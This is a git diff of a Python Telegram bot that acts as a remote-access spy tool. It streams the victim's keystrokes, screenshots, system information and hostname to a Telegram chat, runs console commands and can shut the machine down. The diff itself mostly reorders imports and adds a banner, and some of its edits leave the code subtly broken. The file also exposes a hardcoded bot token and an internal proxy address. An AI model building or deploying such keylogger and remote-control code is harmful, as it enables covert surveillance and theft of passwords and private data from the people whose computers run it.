@@ -1,17 +1,20 @@
 import subprocess
 import telebot
 import emoji
-from pynput import keyboard
-from datetime import datetime
+import pynput
+	# import keyboard
+import datetime
+	# import datetime
 from pynput.keyboard import Key, Controller
 import schedule
 import threading
 import matplotlib.pyplot as plt
 import numpy as np
 import pyautogui
-import random
-
-
+import colored
+import pyfiglet
+from colorama import Fore
+from colorama import Style
 
 bot = telebot.TeleBot("1764092484:AAFH54usSJHnb36qu0xTIvbamqBVXEggnc0")
 telebot.apihelper.proxy = {'https':'http://10.57.10.34:3128'}
@@ -26,7 +29,7 @@ def console(a):
 		bot.send_message(chat_id,"Nhập lại đi, sai cmnr :(( .Mà cũng có thể là nó dài quá. Nó không show được")
 def send_system():
 	system = subprocess.run(["systeminfo"], stdout=subprocess.PIPE)
-	print((system.stdout).decode())
+	# print((system.stdout).decode())
 	return ((system.stdout).decode())
 def get_host_name():
 	icon=emoji.emojize('⛔',language='es')
@@ -34,7 +37,7 @@ def get_host_name():
 	return hostname.stdout.decode()
 def send_notify():
 	icon = emoji.emojize('⛔', language='es')
-	notify=icon+" ["+datetime.now().strftime('%Y-%m-%d %H:%M:%S')+"]"+'\n'+" Have connected from "+get_host_name()
+	notify=icon+" ["+datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')+"]"+'\n'+" Have connected from "+get_host_name()
 	bot.send_message(chat_id,notify)
 def shutdown():
 	shut = subprocess.run(["shutdown","/s"], stdout=subprocess.PIPE)
@@ -56,20 +59,21 @@ def on_press(key):
 	bot.send_message(chat_id, '{0}'.format(key))
 
 def Listener():
+	keyboard=pynput()
 	with keyboard.Listener(on_press=on_press) as listener:
 		listener.join()
 	listener = keyboard.Listener(on_press=on_press)
 	listener.stop()
 
-def send_notify_1():
-	print("them")
-
-	bot.send_message(chat_id, "huhuhu")
-
-def set_time():
-	schedule.every(10).seconds.do(send_notify_1)
-	while True:
-		schedule.run_pending()
+# def send_notify_1():
+# 	print("them")
+#
+# 	bot.send_message(chat_id, "huhuhu")
+#
+# def set_time():
+# 	schedule.every(10).seconds.do(send_notify_1)
+# 	while True:
+# 		schedule.run_pending()
 def dothi(message,x):
 	a = []
 	b = []
@@ -92,7 +96,7 @@ def dothi(message,x):
 	return y
 
 def sceenshot():
-	a="screenshoots/screenshot_"+datetime.now().strftime("%d%m%Y_%H%M%S")+".jpg"
+	a="screenshot_"+datetime.now().strftime("%d%m%Y_%H%M%S")+".jpg"
 	shot=pyautogui.screenshot(a)
 	bot.send_photo(chat_id,photo=open(a,'rb'))
 
@@ -139,7 +143,7 @@ def chart_math(message):
 	y=dothi(message.text,x)
 	plt.plot(x,y)
 	# plt.show()
-	a = "chart/Chart_math" + datetime.now().strftime("%d%m%Y_%H%M%S") + ".png"
+	a = "Chart_math" + datetime.now().strftime("%d%m%Y_%H%M%S") + ".png"
 	plt.savefig(a)
 	bot.send_photo(chat_id, photo=open(a, 'rb'))
 
@@ -156,6 +160,9 @@ def send_sonsole(message):
 # ---------------------------------------------------------------------------
 
 if __name__== '__main__':
+	ascii_banner = pyfiglet.figlet_format("Telegram Bot")
+	print(f'{Fore.LIGHTGREEN_EX}'+ascii_banner)
+	print(f'{Fore.RED}'+"                     By Tuan Pham v.10")
 	send_notify()
 	# threading.Thread(target=plt.show()).start()
 	threading.Thread(target=bot.polling()).start()
